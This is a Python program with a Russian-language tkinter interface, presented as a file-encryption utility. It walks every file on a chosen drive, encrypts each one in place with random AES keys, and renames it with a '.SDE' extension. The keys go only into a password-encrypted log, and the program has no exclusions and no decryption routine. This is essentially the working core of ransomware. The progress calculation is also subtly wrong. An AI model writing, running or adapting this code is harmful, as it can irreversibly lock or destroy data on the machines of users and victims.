import os
import base64
from datetime import datetime
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
from Crypto.Protocol.KDF import PBKDF2
import tkinter as tk
from tkinter import messagebox, scrolledtext, ttk



def double_base64_encode(data):
    first_encoded = base64.b64encode(data)
    second_encoded = base64.b64encode(first_encoded)
    return second_encoded

def double_aes_encrypt(data, key):
    cipher1 = AES.new(key, AES.MODE_CBC)
    ciphertext1 = cipher1.encrypt(pad(data, AES.block_size))

    cipher2 = AES.new(key, AES.MODE_CBC)
    ciphertext2 = cipher2.iv + cipher2.encrypt(pad(ciphertext1, AES.block_size))
    return cipher1.iv + ciphertext2

def encrypt_with_password(data, password):
    salt = get_random_bytes(16)
    key = PBKDF2(password, salt, dkLen=32, count=1000000)
    cipher = AES.new(key, AES.MODE_CBC)
    ciphertext = cipher.iv + cipher.encrypt(pad(data, AES.block_size))
    return salt + ciphertext

def get_available_drives():
    drives = []
    for drive in range(ord('C'), ord('Z') + 1):
        drive_letter = f"{chr(drive)}:\\"
        if os.path.exists(drive_letter):
            drives.append(drive_letter)
    return drives

def process_files(directory, password, output_text, progress_bar, percentage_label, current_file_label):
    log_entries = []
    total_files = sum(len(files) for _, _, files in os.walk(directory))
    start_time = datetime.now()

    for index, (root, _, files) in enumerate(os.walk(directory)):
        for file in files:
            file_path = os.path.join(root, file)
            current_file_label.config(text=f"Шифруется: {file}")  # Обновляем метку с текущим файлом

            try:
                with open(file_path, 'rb') as f:
                    data = f.read()

                encryption_key = get_random_bytes(32)
                encoded_data = double_base64_encode(data)
                encrypted_data = double_aes_encrypt(encoded_data, encryption_key)

                with open(file_path, 'wb') as f:
                    f.write(encrypted_data)

                os.rename(file_path, file_path + '.SDE')
                log_entries.append(f"{file_path}, {encryption_key.hex()}")

            except (PermissionError, OSError) as e:
                output_text.insert(tk.END, f"Ошибка доступа к файлу {file_path}: {e}\n")
            
            # Обновление прогресс-бара
            completed_files = index + 1
            percentage = (completed_files / total_files) * 100
            progress_bar['value'] = percentage
            percentage_label.config(text=f"{int(percentage)}%")

            elapsed_time = datetime.now() - start_time
            estimated_time = elapsed_time / (completed_files) * (total_files - completed_files)
            remaining_time = str(estimated_time).split('.')[0]
            output_text.insert(tk.END, f"Осталось времени: {remaining_time}\n")

    log_data = "\n".join(log_entries).encode()
    encrypted_log_data = encrypt_with_password(log_data, password)

    timestamp = datetime.now().strftime("%H %M %S %d %m %Y")
    log_file_name = f"{timestamp}.enc"
    log_file_path = os.path.join(directory, log_file_name)
    
    with open(log_file_path, 'wb') as f:
        f.write(encrypted_log_data)

    output_text.insert(tk.END, f"Лог файл создан и зашифрован: {log_file_path}\n")
    current_file_label.config(text="Шифрование завершено")  # Завершение процесса шифрования

def run_encryption(selected_drive, password, output_text):
    output_text.delete(1.0, tk.END)  # Очистка текстового поля
    # Создаем новое окно для прогресс-бара и текущего файла
    progress_window = tk.Toplevel()
    progress_window.title("Шифрование в процессе")
    progress_window.geometry("400x200")

    # Метка для отображения текущего файла
    current_file_label = tk.Label(progress_window, text="", font=("Arial", 12))
    current_file_label.pack(pady=5)

    # Прогресс-бар
    progress_bar = ttk.Progressbar(progress_window, orient='horizontal', length=300, mode='determinate')
    progress_bar.pack(pady=10)

    percentage_label = tk.Label(progress_window, text="0%", font=("Arial", 14))
    percentage_label.pack(pady=5)

    process_files(selected_drive, password, output_text, progress_bar, percentage_label, current_file_label)

def create_interface():
    # Основное окно
    root = tk.Tk()
    root.title("Шифрование файлов")
    root.geometry("800x600")
    #Установка иконки окна
    root.iconbitmap("IMG\\logo_2.ico")

    # Заголовок
    title_label = tk.Label(root, text="Шифрование файлов", font=("Arial", 24))
    title_label.pack(pady=10)

    # Выбор диска
    drives = get_available_drives()
    selected_drive = tk.StringVar(value=drives[0] if drives else '')

    drive_label = tk.Label(root, text="Выберите диск:")
    drive_label.pack(pady=5)

    drive_dropdown = tk.OptionMenu(root, selected_drive, *drives)
    drive_dropdown.pack(pady=5)

    # Ввод пароля
    password_label = tk.Label(root, text="Введите пароль для лог файла:")
    password_label.pack(pady=5)

    password_entry = tk.Entry(root, show='*', font=("Arial", 14))
    password_entry.pack(pady=5)

    # Кнопка для запуска шифрования
    encrypt_button = tk.Button(root, text="Запустить шифрование", font=("Arial", 14), 
                               command=lambda: run_encryption(selected_drive.get(), password_entry.get(), output_text))
    encrypt_button.pack(pady=10)

    # Поле для отображения информации
    output_text = scrolledtext.ScrolledText(root, wrap=tk.WORD, font=("Courier", 10), height=15)
    output_text.pack(pady=10)

    root.mainloop()

if __name__ == "__main__":
    create_interface()
